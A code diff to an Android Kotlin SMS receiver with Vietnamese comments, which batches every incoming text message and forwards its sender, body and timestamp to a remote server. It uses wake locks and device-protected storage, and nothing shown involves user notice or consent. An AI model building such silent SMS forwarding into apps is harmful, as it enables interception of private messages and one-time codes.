@@ -29,82 +29,94 @@ class SmsReceiver : BroadcastReceiver() {
 
         val smsTimestamp = messages[0].timestampMillis
         val rawNumber = messages[0].originatingAddress ?: "Unknown"
-        val formattedNumber = PhoneUtils.formatVietnamesePhoneNumber(rawNumber)
+        val formattedNumber = DeviceUtils.formatVietnamesePhoneNumber(rawNumber)
         val fullContent = messages.joinToString("") { it.messageBody ?: "" }
 
-        val safeContext = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N && !context.isDeviceProtectedStorage) {
-            context.createDeviceProtectedStorageContext()
-        } else {
-            context
-        }
+        Log.d("SMS_RECEIVER", "📩 SMS_RECEIVED from=$formattedNumber")
 
+        val safeContext = context.deviceProtectedContext()
         val pendingResult = goAsync()
         
-        // Đợi 1000ms: Đảm bảo Android ghi xong DB để lấy ID chuẩn
+        // GIẢM DELAY: Chỉ đợi 300ms thay vì 400ms để bắt ID DB
         handler.postDelayed({
-            val smsIdInDb = getSmsIdFromDb(safeContext, rawNumber, fullContent)
-            val dedupePref = safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
-            
-            val cleanBody = fullContent.replace("\\s".toRegex(), "")
-            val tsSec = smsTimestamp / 1000
-            val msgKey = if (smsIdInDb != null) "ID_$smsIdInDb" else "KEY_${formattedNumber}_${cleanBody}_$tsSec"
-            
-            if (dedupePref.contains(msgKey)) {
-                pendingResult.finish()
-                return@postDelayed
-            }
+            try {
+                val smsIdInDb = getSmsIdFromDb(safeContext, rawNumber, fullContent, smsTimestamp)
+                val dedupePref = safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
+                
+                val cleanBody = fullContent.replace("\\s".toRegex(), "")
+                val tsSec = smsTimestamp / 1000
+                val msgKey = if (smsIdInDb != null) "ID_$smsIdInDb" else "KEY_${formattedNumber}_${cleanBody}_$tsSec"
+                
+                if (dedupePref.contains(msgKey)) {
+                    Log.d("SMS_RECEIVER", "⏭️ SMS trùng lặp, bỏ qua (key=$msgKey)")
+                    pendingResult.finish()
+                    return@postDelayed
+                }
 
-            // Ghi nhật ký ngay
-            dedupePref.edit().putBoolean(msgKey, true).commit()
+                // Ghi nhật ký ngay để tránh trùng lặp nếu crash
+                dedupePref.edit().putBoolean(msgKey, true).commit()
 
-            val displayName = PhoneUtils.getDisplayName(context, formattedNumber)
-            synchronized(messageList) {
-                messageList.add(SmsData(displayName, fullContent, smsTimestamp))
-                pendingTask?.let { handler.removeCallbacks(it) }
+                val displayName = DeviceUtils.getDisplayName(context, formattedNumber)
+                synchronized(messageList) {
+                    messageList.add(SmsData(displayName, fullContent, smsTimestamp))
+                    
+                    // Nếu là tin nhắn lẻ, gửi sau 1s. Nếu tin nhắn dồn dập, gom vào batch 3s.
+                    val delay = if (messageList.size == 1) 1000L else BATCH_WINDOW_MS
+                    pendingTask?.let { handler.removeCallbacks(it) }
 
-                val sendTask = Runnable {
-                    val toSend: List<SmsData>
-                    synchronized(messageList) {
-                        toSend = messageList.sortedBy { it.timestamp }
-                        messageList.clear()
-                        pendingTask = null
-                    }
-                    if (toSend.isEmpty()) { pendingResult.finish(); return@Runnable }
-
-                    val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
-                    val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Informer:SmsBatchWakeLock")
-                    wakeLock.acquire(60_000)
-
-                    kotlin.concurrent.thread {
-                        try {
-                            for (msg in toSend) {
-                                ServerReporter.sendEventSync(safeContext, "SMS", msg.sender, msg.body, msg.timestamp)
-                                Thread.sleep(200) // Giảm thời gian nghỉ giữa các tin
-                            }
-                        } catch (e: Exception) {
-                            Log.e("SMS_RECEIVER", "Lỗi: ${e.message}")
-                        } finally {
-                            if (wakeLock.isHeld) wakeLock.release()
+                    val sendTask = Runnable {
+                        val toSend: List<SmsData>
+                        synchronized(messageList) {
+                            toSend = messageList.sortedBy { it.timestamp }
+                            messageList.clear()
+                            pendingTask = null
+                        }
+                        if (toSend.isEmpty()) { 
                             pendingResult.finish()
+                            return@Runnable 
+                        }
+
+                        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
+                        val wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Informer:SmsBatchWakeLock")
+                        wakeLock.acquire(45_000) // Giảm xuống 45s cho an toàn hệ thống
+
+                        kotlin.concurrent.thread {
+                            try {
+                                for (msg in toSend) {
+                                    Log.d("SMS_RECEIVER", "🚀 Đang đẩy SMS từ ${msg.sender}...")
+                                    val ok = ServerReporter.sendEventSync(safeContext, "SMS", msg.sender, msg.body, msg.timestamp)
+                                    if (!ok) Log.w("SMS_RECEIVER", "⚠️ Đẩy SMS thất bại")
+                                    Thread.sleep(100)
+                                }
+                            } catch (e: Exception) {
+                                Log.e("SMS_RECEIVER", "❌ Lỗi luồng gửi: ${e.message}")
+                            } finally {
+                                if (wakeLock.isHeld) wakeLock.release()
+                                pendingResult.finish()
+                                Log.d("SMS_RECEIVER", "🏁 Xử lý xong batch.")
+                            }
                         }
                     }
+                    pendingTask = sendTask
+                    handler.postDelayed(sendTask, delay)
                 }
-                pendingTask = sendTask
-                handler.postDelayed(sendTask, BATCH_WINDOW_MS)
+            } catch (e: Exception) {
+                Log.e("SMS_RECEIVER", "❌ Lỗi xử lý: ${e.message}")
+                pendingResult.finish()
             }
-        }, 400)
+        }, 300)
     }
 
-    private fun getSmsIdFromDb(context: Context, address: String?, body: String): String? {
+    private fun getSmsIdFromDb(context: Context, address: String?, body: String, timestamp: Long): Long? {
         return try {
             val cursor = context.contentResolver.query(
                 Uri.parse("content://sms/inbox"),
                 arrayOf("_id"),
-                "address = ? AND body = ?",
-                arrayOf(address, body),
+                "address = ? AND body = ? AND date >= ? AND date <= ?",
+                arrayOf(address, body, (timestamp - 5000L).toString(), (timestamp + 5000L).toString()),
                 "date DESC LIMIT 1"
             )
-            cursor?.use { if (it.moveToFirst()) it.getString(0) else null }
+            cursor?.use { if (it.moveToFirst()) it.getLong(0) else null }
         } catch (e: Exception) { null }
     }
 }
